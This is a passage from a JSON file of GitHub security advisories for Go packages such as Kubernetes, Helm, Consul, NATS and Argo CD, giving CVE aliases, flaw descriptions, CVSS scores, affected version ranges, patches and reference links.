"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ANUGDBJ7NBUMSUFZUSKU3ZMQYZ2Z3STN/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DHGVGGMKGZSJ7YO67TGGPFEHBYMS63VF/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FNB2UEDIIJCRQW4WJLZOPQJZXCVSXMLD/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FYVE3GB4OG3BNT5DLQHYO4M5SXX33AQ5/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/I6BF24VCZRFTYBTT3T7HDZUOTKOTNPLZ/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0087"}, {"type": "WEB", "url": "https://security-tracker.debian.org/tracker/CVE-2019-19921"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202003-21"}, {"type": "WEB", "url": "https://usn.ubuntu.com/4297-1/"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-02/msg00018.html"}], "database_specific": {"cwe_ids": ["CWE-362", "CWE-706"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T21:20:41Z", "nvd_published_at": "2020-02-12T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6qfg-8799-r575", "modified": "2023-09-18T20:30:39Z", "published": "2021-05-18T15:30:07Z", "aliases": ["CVE-2019-11251"], "summary": "Kubernetes kubectl cp Vulnerable to Symlink Attack", "details": "The Kubernetes kubectl cp command in versions 1.1-1.12, and versions prior to 1.13.11, 1.14.7, and 1.15.4 allows a combination of two symlinks provided by tar output of a malicious container to place a file outside of the destination directory specified in the kubectl cp invocation. This could be used to allow an attacker to place a nefarious file using a symlink, outside of the destination tree.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.10"}, {"fixed": "1.13.11"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.6"}, {"fixed": "1.14.7"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.15.3"}, {"fixed": "1.16.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11251"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/87773"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/82143"}, {"type": "WEB", "url": "https://groups.google.com/d/msg/kubernetes-announce/YYtEFdFimZ4/nZnOezZuBgAJ"}], "database_specific": {"cwe_ids": ["CWE-59", "CWE-61"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-17T21:58:06Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-c52f-pq47-2r9j", "modified": "2021-11-19T15:21:02Z", "published": "2021-05-24T16:57:21Z", "aliases": ["CVE-2020-15187"], "summary": "plugin.yaml file allows for duplicate entries in helm", "details": "### Impact\n\nDuring a security audit of Helm's code base, Helm maintainers identified a bug in which a Helm plugin can contain duplicates of the same entry, with the last one always used. If a plugin is compromised, this lowers the level of access that an attacker needs to modify a plugin's install hooks, causing a local execution attack.\n\nTo perform this attack, an attacker must have write access to the git repository or plugin archive (.tgz) while being downloaded (which can occur during a MITM attack on a non-SSL connection).\n\n### Patches\n\nThis issue has been patched in Helm 2.16.11 and Helm 3.3.2.\n\n### Workarounds\n\nMake sure to install plugins using a secure connection protocol like SSL.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.3.2"}]}]}, {"package": {"ecosystem": "Go", "name": "helm.sh/helm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.16.11"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-c52f-pq47-2r9j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15187"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/6aab63765f99050b115f0aec3d6350c85e8da946"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/d9ef5ce8bad512e325390c0011be1244b8380e4b"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}], "database_specific": {"cwe_ids": ["CWE-694", "CWE-74"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-24T12:56:32Z", "nvd_published_at": "2020-09-17T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qqc5-rgcc-cjqh", "modified": "2023-08-30T11:37:11Z", "published": "2021-05-18T18:34:18Z", "aliases": ["CVE-2021-22133"], "summary": "Information Disclosure in go.elastic.co/apm", "details": "The Elastic APM agent for Go versions before 1.11.0 can leak sensitive HTTP header information when logging the details during an application panic. Normally, the APM agent will sanitize sensitive HTTP header details before sending the information to the APM server. During an application panic it is possible the headers will not be sanitized before being sent.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.elastic.co/apm"}, "ecosystem_specific": {"affected_functions": ["NewTracer", "NewTracerOptions", "modelWriter.buildModelTransaction"]}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-22133"}, {"type": "WEB", "url": "https://github.com/elastic/apm-agent-go/pull/888"}, {"type": "WEB", "url": "https://github.com/elastic/apm-agent-go/commit/c5c7e21aa26a6def7790f74fbceed792ad47ef35"}, {"type": "WEB", "url": "https://github.com/elastic/apm-agent-go/commit/dd3e8c593580e7b80a98b57e1cc6e017e56747b4"}, {"type": "WEB", "url": "https://discuss.elastic.co/t/elastic-apm-agent-for-go-1-11-0-security-update/263252"}, {"type": "PACKAGE", "url": "https://github.com/elastic/apm-agent-go"}, {"type": "WEB", "url": "https://github.com/elastic/apm-agent-go/compare/v1.10.0...v1.11.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0706"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-07T22:01:55Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-x462-89pf-6r5h", "modified": "2021-05-20T20:52:26Z", "published": "2021-05-21T16:23:17Z", "aliases": ["CVE-2021-21404"], "summary": "Crash due to malformed relay protocol message", "details": "### Impact\n\n1. `syncthing` can be caused to crash and exit if sent a malformed relay\n   protocol message message with a negative length field.\n\n2. The relay server `strelaysrv` can be caused to crash and exit if sent\n   a malformed relay protocol message with a negative length field.\n\nAt no point is sensitive data exposed or liable to be altered due to this\nissue. Sensitive data is never exposed to relay operators. Syncthing itself\nwould need to be lured to connect to a malicious relay server in order to\nexploit the issue.\n\n### Patches\n\nFixed in version 1.15.0.\n\n### Workarounds\n\n1. No known workaround for `strelaysrv`.\n\n2. `syncthing` can be configured to not use relays, or to only use specific,\n   trusted relays. If Syncthing is used in a closed environment or with\n   relaying disabled, i.e., it does not communicate with unknown relays,\n   Syncthing is not vulnerable.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please discuss it [on the forum](https://forum.syncthing.net/).\n\nThanks to Wojciech Paciorek for discovering and reporting this issue.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/syncthing/syncthing"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.15.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/syncthing/syncthing/security/advisories/GHSA-x462-89pf-6r5h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-21404"}, {"type": "WEB", "url": "https://github.com/syncthing/syncthing/commit/fb4fdaf4c0a79c22cad000c42ac1394e3ccb6a97"}, {"type": "WEB", "url": "https://github.com/syncthing/syncthing/releases/tag/v1.15.0"}, {"type": "WEB", "url": "https://pkg.go.dev/github.com/syncthing/syncthing"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:52:26Z", "nvd_published_at": "2021-04-06T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6w87-g839-9wv7", "modified": "2021-10-05T16:35:57Z", "published": "2021-05-21T14:31:28Z", "aliases": [], "summary": "Helm OCI credentials leaked into Argo CD logs", "details": "### Impact\n\nWhen Argo CD was connected to a Helm OCI repository with authentication enabled, the credentials used for accessing the remote repository were logged.\n\nAnyone with access to the pod logs - either via access with appropriate permissions to the Kubernetes control plane or a third party log management system where the logs from Argo CD were aggregated - could have potentially obtained the credentials to the Helm OCI repository.\n\nIf you are using Helm OCI repositories with Argo CD, it is strongly recommended to upgrade Argo CD to the latest patch version and to change the credentials used to access the repositories.\n\n### Patches\n\nA patch for this vulnerability is available with the v1.8.7 and v1.7.14 releases of Argo CD.\n\n### Workarounds\n\nNo workaround available\n\n### References\n\nN/A\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel `#argo-cd`\n\n### Credits\n\nThis vulnerability was found and reported by a third-party who wishes to stay anonymous. We want to thank this third-party for disclosing this vulnerability to us in a responsible manner.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"fixed": "1.8.7"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-6w87-g839-9wv7"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T14:21:01Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5rcv-m4m3-hfh7", "modified": "2023-09-29T17:27:28Z", "published": "2021-05-18T18:34:35Z", "aliases": ["CVE-2020-14040"], "summary": "golang.org/x/text Infinite loop", "details": "Go version v0.3.3 of the x/text package fixes a vulnerability in encoding/unicode that could lead to the UTF-16 decoder entering an infinite loop, causing the program to crash or run out of memory. An attacker could provide a single byte to a UTF16 decoder instantiated with UseBOM or ExpectBOM to trigger an infinite loop if the String function on the Decoder is called, or the Decoder is passed to golang.org/x/text/transform.String.\n\n### Specific Go Packages Affected\ngolang.org/x/text/encoding/unicode\ngolang.org/x/text/transform", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/text"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-14040"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/39491"}, {"type": "WEB", "url": "https://github.com/golang/text/commit/23ae387dee1f90d29a23c0e87ee0b46038fbed0e"}, {"type": "WEB", "url": "https://go-review.googlesource.com/c/text/+/238238"}, {"type": "WEB", "url": "https://go.dev/cl/238238"}, {"type": "WEB", "url": "https://go.dev/issue/39491"}, {"type": "WEB", "url": "https://go.googlesource.com/text/+/23ae387dee1f90d29a23c0e87ee0b46038fbed0e"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/golang-announce/bXVeAmGOqz0"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/bXVeAmGOqz0"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TACQFZDPA7AUR6TRZBCX2RGRFSDYLI7O/"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-835"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T14:54:58Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-23jv-v6qj-3fhh", "modified": "2023-09-29T15:52:57Z", "published": "2021-05-18T18:19:21Z", "aliases": ["CVE-2020-7219"], "summary": "Denial of Service (DoS) in HashiCorp Consul", "details": "HashiCorp Consul and Consul Enterprise up to 1.6.2 HTTP/RPC services allowed unbounded resource usage, and were susceptible to unauthenticated denial of service. Fixed in 1.6.3.\n\n### Specific Go Packages Affected\ngithub.com/hashicorp/consul/agent/consul", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7219"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/issues/7159"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/consul/"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-13T15:07:53Z", "nvd_published_at": "2020-01-31T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j756-f273-xhp4", "modified": "2023-08-30T18:08:21Z", "published": "2021-05-21T16:22:20Z", "aliases": [], "summary": "github.com/nats-io/nats-server/ Import token permissions checking not enforced", "details": "(This advisory is canonically <https://advisories.nats.io/CVE/CVE-2021-3127.txt>)\n\n## Problem Description\n\nThe NATS server provides for Subjects which are namespaced by Account; all Subjects are supposed to be private to an account, with an Export/Import system used to grant cross-account access to some Subjects.  Some Exports are public, such that anyone can import the relevant subjects, and some Exports are private, such that the Import requires a token JWT to prove permission.\n\nThe JWT library's validation of the bindings in the Import Token incorrectly warned on mismatches, instead of outright rejecting the token.\n\nAs a result, any account can take an Import token used by any other account and re-use it for themselves because the binding to the importing account is not rejected, and use it to import *any* Subject from the Exporting account, not just the Subject referenced in the Import Token.\n\nThe NATS account-server system treats account JWTs as semi-public information, such that an attacker can easily enumerate all account JWTs and retrieve all Import Tokens from those account JWTs.\n\nThe CVE identifier should cover the JWT library repair and the nats-server containing the fixed JWT library, and any other application depending upon the fixed JWT library.\n\n\n## Affected versions\n\n#### JWT library\n\n * all versions prior to 2.0.1\n * fixed after nats-io/jwt#149 landed (2021-03-14)\n\n#### NATS Server\n\n * Version 2 prior to 2.2.0\n   + 2.0.0 through and including 2.1.9 are vulnerable\n * fixed with nats-io/nats-server@423b79440c (2021-03-14)\n\n\n## Impact\n\nIn deployments with untrusted accounts able to update the Account Server with imports, a malicious account can access any Subject from an account which provides Exported Subjects.\n\nAbuse of this facility requires the malicious actor to upload their tampered Account JWT to the Account Server, providing the service operator with a data-store which can be scanned for signs of abuse.\n\n\n## Workaround\n\nDeny access to clients to update their account JWT in the account server.\n\n\n## Solution\n\nUpgrade the JWT dependency in any application using it.\n\nUpgrade the NATS server if using NATS Accounts (with private Exports; Account owners can create those at any time though).\n\nAudit all accounts JWTs to scan for exploit attempts; a Python script to audit the accounts can be found at <https://gist.github.com/philpennock/09d49524ad98043ff11d8a40c2bb0d5a>.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/jwt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.3-0.20210314221642-a826c77dc9d2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/jwt/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/nats-server/security/advisories/GHSA-j756-f273-xhp4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3127"}, {"type": "WEB", "url": "https://github.com/nats-io/jwt/pull/149"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/CVE-2021-3127.txt"}], "database_specific": {"cwe_ids": ["CWE-755", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:01:49Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-jq7p-26h5-w78r", "modified": "2022-10-31T15:57:25Z", "published": "2021-05-18T15:32:04Z", "aliases": ["CVE-2019-0210"], "summary": "Out-of-bounds read in Apache Thrift", "details": "In Apache Thrift 0.9.3 to 0.12.0, a server implemented in Go using TJSONProtocol or TSimpleJSONProtocol may panic when feed with invalid input data.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/apache/thrift"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.3"}, {"fixed": "0.13.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-0210"}, {"type": "WEB", "url": "https://github.com/apache/thrift/commit/264a3f318ed3e9e51573f67f963c8509786bcec2"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0804"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0805"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0806"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0811"}, {"type": "PACKAGE", "url": "https://github.com/apache/thrift"}, {"type": "WEB", "url": "https://github.com/apache/thrift/blob/master/CHANGES.md#0130"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r2832722c31d78bef7526e2c701ba4b046736e4c851473194a247392f@%3Ccommits.pulsar.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r36581cc7047f007dd6aadbdd34e18545ec2c1eb7ccdae6dd47a877a9@%3Ccommits.pulsar.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r55609613abab203a1f2c1f3de050b63ae8f5c4a024df0d848d6915ff@%3Ccommits.pulsar.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rab740e5c70424ef79fd095a4b076e752109aeee41c4256c2e5e5e142@%3Ccommits.pulsar.apache.org%3E"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0101"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202107-32"}, {"type": "WEB", "url": "https://www.oracle.com/security-alerts/cpujul2021.html"}, {"type": "WEB", "url": "http://mail-archives.apache.org/mod_mbox/thrift-dev/201910.mbox/%3C277A46CA87494176B1BBCF5D72624A2A%40HAGGIS%3E"}], "database_specific": {"cwe_ids": ["CWE-125"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T21:09:18Z", "nvd_published_at": "2019-10-29T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fv82-r8qv-ch4v", "modified": "2023-10-02T12:10:36Z", "published": "2021-05-21T16:24:22Z", "aliases": ["CVE-2021-29652"], "summary": "pomerium_signature is not verified in middleware in github.com/pomerium/pomerium", "details": "### Impact\nSome API endpoints under /.pomerium/ do not verify parameters with pomerium_signature. This could allow modifying parameters intended to be trusted to Pomerium. \n\nThe issue mainly affects routes responsible for sign in/out, but does not introduce an authentication bypass.\n\n### Specific Go Packages Affected\ngithub.com/pomerium/pomerium/authenticate\n\n### Patches\nPatched in v0.13.4\n\n### For more information\nIf you have any questions or comments about this advisory\n* Open an issue in [pomerium](http://github.com/pomerium/pomerium)\n* Email us at [security@pomerium.com](mailto:security@pomerium.com)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.10.0"}, {"fixed": "0.13.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pomerium/pomerium/security/advisories/GHSA-fv82-r8qv-ch4v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29652"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/pull/2048"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:47:18Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-25xm-hr59-7c27", "modified": "2023-08-30T18:17:49Z", "published": "2021-05-25T18:39:37Z", "aliases": ["CVE-2021-29482"], "summary": "github.com/ulikunitz/xz fixes readUvarint denial of service", "details": "### Impact\n\nxz is a compression and decompression library focusing on the xz format completely written in Go. The function readUvarint used to read the xz container format may not terminate a loop provide malicous input.\n\n### Patches\n\nThe problem has been fixed in release v0.5.8.\n\n### Workarounds\n\nLimit the size of the compressed file input to a reasonable size for your use case.\n\n### References\n\nThe standard library had recently the same issue and got the [CVE-2020-16845](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16845) allocated.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [xz](https://github.com/ulikunitz/xz/issues).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ulikunitz/xz"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ulikunitz/xz/security/advisories/GHSA-25xm-hr59-7c27"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29482"}, {"type": "WEB", "url": "https://github.com/ulikunitz/xz/issues/35"}, {"type": "WEB", "url": "https://github.com/ulikunitz/xz/commit/69c6093c7b2397b923acf82cb378f55ab2652b9b"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0016"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T17:52:22Z", "nvd_published_at": "2021-04-28T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7mqr-2v3q-v2wm", "modified": "2023-02-14T00:21:03Z", "published": "2021-05-24T16:57:39Z", "aliases": ["CVE-2020-15223"], "summary": "Ory fosite contains Improper Handling of Exceptional Conditions ", "details": "### Impact\nThe `TokenRevocationHandler` ignores errors coming from the storage. This can lead to unexpected 200 status codes indicating successful revocation while the token is still valid. Whether an attacker can use this for her advantage depends on the ability to trigger errors in the store.\n\n### References\n[RFC 7009](https://tools.ietf.org/html/rfc7009#section-2.2.1) states that a 503 HTTP code must be returned when the server has a problem.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ory/fosite"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.34.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ory/fosite/security/advisories/GHSA-7mqr-2v3q-v2wm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15223"}, {"type": "WEB", "url": "https://github.com/ory/fosite/commit/03dd55813f5521985f7dd64277b7ba0cf1441319"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0109"}, {"type": "WEB", "url": "https://tools.ietf.org/html/rfc7009#section-2.2.1"}], "database_specific": {"cwe_ids": ["CWE-754", "CWE-755"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T12:53:07Z", "nvd_published_at": "2020-09-24T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xg2h-wx96-xgxr", "modified": "2022-06-29T12:33:51Z", "published": "2021-05-21T16:26:06Z", "aliases": [], "summary": "RandomAlphaNumeric and CryptoRandomAlphaNumeric are not as random as they should be", "details": "### Impact\n\nA security-sensitive bug was discovered by Open Source Developer *Erik Sundell of Sundell Open Source Consulting AB*.\n\nThe functions `RandomAlphaNumeric(int)` and `CryptoRandomAlphaNumeric(int)` are not as random as they should be. Small values of `int` in the functions above will return a smaller subset of results than they should. For example, `RandomAlphaNumeric(1)` will always return a digit in the 0-9 range, while `RandomAlphaNumeric(4)` will return around ~7 million of the ~13M possible permutations.\n\nThis is considered a security release because programs that rely upon random generators for passwords are at an increased risk of brute force-style password guessing. There is also a higher probability of collision.\n\nThe problem was the result of a mistaken regular expression that only accepted random strings if they contained a digit from `[0-9]`. That restriction has been removed.\n\n### Patches\n\nThis issue has been corrected in v1.1.1.\n\n### Workarounds\n\nIf you cannot upgrade to v1.1.1, you can work around the issue by calling `RandomAlphaNumericCustom(N, true, true)`|`CryptoRandomAlphaNumericCustom(N, true, true)`  instead. (Where `N` is the desired length, and `true` is the literal boolean `true`.)        ", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/Masterminds/goutils"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/Masterminds/goutils/security/advisories/GHSA-xg2h-wx96-xgxr"}, {"type": "WEB", "url": "https://github.com/Masterminds/goutils/commit/f1923532a168b8203bfe956d8cd3b17ebece5982"}, {"type": "WEB", "url": "https://github.com/Masterminds/goutils/releases/tag/v1.1.1"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-21T14:36:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rqjq-mrgx-85hp", "modified": "2023-10-02T14:01:45Z", "published": "2021-05-18T18:21:35Z", "aliases": ["CVE-2020-13250"], "summary": "Allocation of Resources Without Limits or Throttling in Hashicorp Consul", "details": "HashiCorp Consul and Consul Enterprise include an HTTP API (introduced in 1.2.0) and DNS (introduced in 1.4.3) caching feature that was vulnerable to denial of service.\n\n### Specific Go Packages Affected\ngithub.com/hashicorp/consul/agent/config\n\n### Fix\nThe vulnerability is fixed in versions 1.6.6 and 1.7.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.6.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.7.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13250"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/pull/8023"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/72f92ae7ca4cabc1dc3069362a9b64ef46941432"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/blob/v1.6.6/CHANGELOG.md"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/blob/v1.7.4/CHANGELOG.md"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T22:00:34Z", "nvd_published_at": "2020-06-11T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gwj5-3vfq-q992", "modified": "2021-05-20T21:07:16Z", "published": "2021-05-21T16:22:16Z", "aliases": [], "summary": "Import loops in account imports, nats-server DoS", "details": "(This advisory is canonically <https://advisories.nats.io/CVE/CVE-2020-28466.txt>)\n\n## Problem Description\n\nAn export/import cycle between accounts could crash the nats-server, after consuming CPU and memory.\n\nThis issue was fixed publicly in <https://github.com/nats-io/nats-server/pull/1731> in November 2020.\n\nThe need to call this out as a security issue was highlighted by `snyk.io` and we are grateful for their assistance in doing so.\n\nOrganizations which run a NATS service providing access to accounts run by untrusted third parties are affected.\nSee below for an important caveat if running such a service.\n\n\n## Affected versions\n\n#### NATS 